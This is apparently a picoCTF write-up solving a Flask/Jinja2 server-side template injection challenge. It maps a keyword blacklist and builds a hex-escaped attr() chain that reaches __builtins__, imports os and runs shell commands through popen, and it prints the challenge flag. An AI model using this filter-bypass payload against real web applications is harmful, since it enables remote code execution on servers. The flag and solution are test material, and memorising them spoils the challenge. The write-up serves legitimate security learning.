## Description:
**I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)**

## Challenge Overview 🎯
Got an SSTI challenge with heavy input sanitization. When I tried basic payloads like:
```bash
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```
I got: Stop trying to break me >:(\
Clearly there was some serious filtering going on!

## Initial Testing 🧪
**Step 1: Confirm SSTI**
```bash
{{7*7}}
→ 49
```
Great! Template injection confirmed. ✅\
**Step 2: Map the Blacklist**\
Tested individual components:
```bash
{{config}} → Works, returns config data ✅
{{__}} → Blank page ❌
{{os}} → Blank page ❌  
{{class}} → Blank page ❌
{{globals}} → Blank page ❌
{{import}} → Blank page ❌
```
So keywords like __, os, class, globals, import were blacklisted.

## Bypass Attempt #1: String Construction 💥
Tried various encoding methods:
```bash
{{config["__cl"+"ass__"]}} → Break message ❌
{{config["\x5f\x5fclass\x5f\x5f"]}} → Break message ❌
```
But found that attr() filter with hex encoding worked:
```bash
{{config|attr("\x5f\x5fclass\x5f\x5f")}} → Works! ✅
```

## Building the Chain Step by Step 🔗
**Step 1: Access Class Methods**
```bash
{{config|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5finit\x5f\x5f")}} → Works ✅
```
**Step 2: Access Globals**
```bash
{{config|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")}} → Works ✅
```
**Step 3: Try Direct Module Access**
```bash
{{config|attr("\x5f\x5fclass\x5f\x5f")|attr("\x5f\x5finit\x5f\x5f")|attr("\x5f\x5fglobals\x5f\x5f")["\x6f\x73"]}} → Break message! ❌
```
Even hex-encoded os was blocked! 😤

## The Breakthrough Moment 💡
After trying tons of different approaches (subprocess, sys, builtins, MRO, etc.), I realized I needed to use a different object and access method.\
**The Key Insight**\
Instead of config, I switched to request and used application to access Flask's globals, then used __getitem__ instead of direct bracket notation!

## Final Working Payload 🚀
```bash
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
**Payload Breakdown:**\
● request|attr('application') - Access Flask application object\
● |attr('\x5f\x5fglobals\x5f\x5f') - Get globals (hex: __globals__)\
● |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f') - Get builtins using __getitem__ method\
● |attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f') - Get import function\
● ('os') - Import os module\
● |attr('popen')('id')|attr('read')() - Execute command and read output\

**Final command executed: id (change to cat flag for the actual flag!)**
## 🚩Flag: picoCTF{sst1_f1lt3r_byp4ss_3cfcf706}
